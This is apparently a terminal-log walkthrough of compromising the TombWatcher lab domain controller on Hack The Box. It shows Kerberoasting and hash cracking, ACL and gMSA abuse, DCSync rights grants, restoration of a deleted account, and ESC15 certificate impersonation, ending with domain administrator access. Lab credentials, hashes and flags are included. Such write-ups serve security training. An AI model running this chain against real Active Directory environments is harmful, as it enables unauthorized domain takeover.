PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 09:50:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-19T09:52:15+00:00; -3h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-19T09:52:14+00:00; -3h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-19T09:52:15+00:00; -3h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-19T09:52:14+00:00; -3h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49756/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

└─$ netexec smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share 

//we found henry has writeSPN to alfred


└─$ sudo ntpdate tombwatcher.htb        
[sudo] password for ed: 
2025-08-19 21:22:43.933209 (+1000) -10799.687373 +/- 0.101351 tombwatcher.htb 10.10.11.72 s1 no-leap
CLOCK: time stepped by -10799.687373
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ python3 ~/tools/AD/targetedKerberoast.py -d tombwatcher.htb -u henry -p H3nry_987TGV! -v
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$417fe67ad615e2044050adb6f2d6a4c2$ce7c0c8fc323cbf0b8d01b8b7df27265653b4e6cd204b72b84666f94e12f83ed4d0abb95595f4b5b7f937ba6f2f553a46f37cececf70791e0a74862507dd06dc9496e53a06245e64ee021d04395a1629b208d9935e1c271653d351be5882dbca740024cfe40b821f2a1ddaee7a710ddb3d4bef952f8912ca61219d76ea60669dec9eb9ff15d2bceb1032e958d11a4c27b3293bd5eb6ececb88c9acd4b8a5c6cf8c905c120b8554365f004e3908090dad1cb9fa9ca63f87a1b8381cf9ed78238b059e2ca2b0433b6a765a42b8da2ab6d29f6153b22e3ad3da2359d2a0b29c2be7cc28dc6b5b281a5f9f9c5eb95dc8cb8e6b0bac27328023909cda37a74eb0bb7db1f31c056635b88ec29b1782bc8b9b5a1f3094b88cdcb0ed3fdd71c4897312a2821e9cb550aaf57c20f44d970e81797b6510b54833aec9b6f16c45cf000565a9082010a052a1aa4b3d3ddd8225a9dd0b637f6cb5ac9e45fc7372ee34107bf426379f7ca00a3a52736cd66c4a349a572a1bfe35f0da3bf4448721cbd38a10c3b4eaaf1140c878a1f3db4489a73e4d5c03b44d919acff61775c1e3d5d2c4f681a3fe4f1266d09d04a65803a1fbc141847cb84c27a009e1820b4effb57472435ba245c32126dc084683203e2e32dd29b145b8aa475bc0ca6f64962e2ca60a93384156ba3c2edea8d1c8bb676a401e21d811fce81bcfed3a4f1ccd1c37de874f516bfa8844f7c7a559c786bfb1407ba7f035dc0b66a77b870cb553d6f16e7bf4747f32c407993ed9fe544208a9d49400a8258334b0484d3ceaafe3e50fe7d836268dc0a1ca7119c69f9c66cb230dc3238a906f789236125f605baf00bfffe16c2ad997c1eae48565744b79ee3ae12247773073558eeeacac3ba2f680b5d7ef8411b21e0376094235dc06ef49f8d9a512074cac6cd795516a282011b0826d6ee71eea8faeea45ffea9deefe230d5dd63188eae82fb5229bb9cd81ee6a99f10c037aa54331e6f202e3789024a23685ecfb0ec180bd6069f4fdb394113707af59d4bc21df2dbe5a612f4b91c29dc00f04d5d2836961de9bb50ca0ee94140352ff56052a2a6f5d672182c67f4e902e4d61d3f806c34808258f709297df0f603d0cf79edb0c8749ef844be5e6b1da6db51c07d5d4821428d09cb11633c5c3b090c0f85952eae966ff9db257f349c9253be19c1d9a9453a8659c6a918fb1a8d56583f9479ed5f4454cbfcede71d6dcfb45c9f441f301967d819865a189b0a625c93ad191fd86a1b8b9d6f41a056d4628c123fda40dd8654960f8b3a643067615f7c39eecfe48fce80ab72e17405437794d6c078edfa0b58628a3b99ae6c7859db09ef4b0731de1034ba84522ad81fa0c7021aa800cbc9e3430fb4d2188f7431f31d243bbe486f5c6d94974d15971461b52c92782c713697315dec9230ef06a562d521dd853b41715ce6fc6c2b1f02625abcd6821670477192dcd
[VERBOSE] SPN removed successfully for (Alfred)

┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ john hash --wordlist=~/tools/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-08-19 21:25) 100.0g/s 76800p/s 76800c/s 76800C/s 123456..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

//ag from bhound, alfred has addself to infrastrucrture group

└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball'  add groupMember INFRASTRUCTURE alfred  
[+] alfred added to INFRASTRUCTURE
//AG from bh, INFRASTRUCTURE has ReadGMSPassword to ansible_dev$

└─$ python3 ~/tools/AD/gMSADumper.py -d 'tombwatcher.htb' -u alfred -p 'basketball'
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
ansible_dev$:aes256-cts-hmac-sha1-96:dae98d218c6a20033dd7e1c6bcf37cde9a7c04a41cfa4a89091bf4c487f2f39a
ansible_dev$:aes128-cts-hmac-sha1-96:0ec1712577c58adc29a193d53fc73bd4
//get ansible gmsa password blob, ag from bh, ansible has force changepasswd of SAM

└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':ecb4146b3f99e6bbf06ca896f504227c'  set password sam password123!
[+] Password changed successfully!
//reset the passwd, here : is sensitive.. ag from bh san has writeOwner to john,not useful, rerun bloodhound-pyhton to get new view

┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u  sam -p 'password123!' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'sam' -target 'john' tombwatcher.htb/'sam':'password123!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250819-222627.bak
[*] DACL modified successfully!

┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' tombwatcher.htb/'sam':'password123!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250819-223046.bak
[*] DACL modified successfully!
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'sam' -p 'password123!'  set password john password123!
[+] Password changed successfully!
                                                                                                               
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ evil-winrm -i tombwatcher.htb -u 'john' -p 'password123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> cd desktop
*Evil-WinRM* PS C:\Users\john\desktop> type user.txt
719d320888f33c055e0d0d7d906b7135

*Evil-WinRM* PS C:\Users\john\desktop> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



*Evil-WinRM* PS C:\Users\john\desktop> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\desktop> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\desktop> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)

┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ certipy-ad find -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250819224117_Certipy.txt'
[*] Wrote text output to '20250819224117_Certipy.txt'
[*] Saving JSON output to '20250819224117_Certipy.json'
[*] Wrote JSON output to '20250819224117_Certipy.json'
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ cat 20250819224117_Certipy.txt                                              
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.


└─$ certipy-ad  req -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'Webserver' -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ ls           
20250819214126_bloodhound.zip  20250819224117_Certipy.txt     dacledit-20250819-222627.bak  reports
20250819215848_bloodhound.zip  20250819231044_bloodhound.zip  dacledit-20250819-223046.bak
20250819222749_bloodhound.zip  administrator.pfx              dacledit-20250819-223423.bak
20250819224117_Certipy.json    dacledit-20250819-222242.bak   hash
                                                                                                                             
┌──(ed㉿kali)-[~/oscptest/TombWatcher.thb]
└─$ certipy-ad  auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.

 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.   ////////////use this function

 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.


# change_password administrator Password123!
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Password123!
Password changed successfully!


┌──(ed㉿kali)-[~/oscptest/fluffy.htb]
└─$ evil-winrm -i tombwatcher.htb -u 'Administrator' -p 'Password123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
28c3a81f2e577b160a657eaf13d6dec0

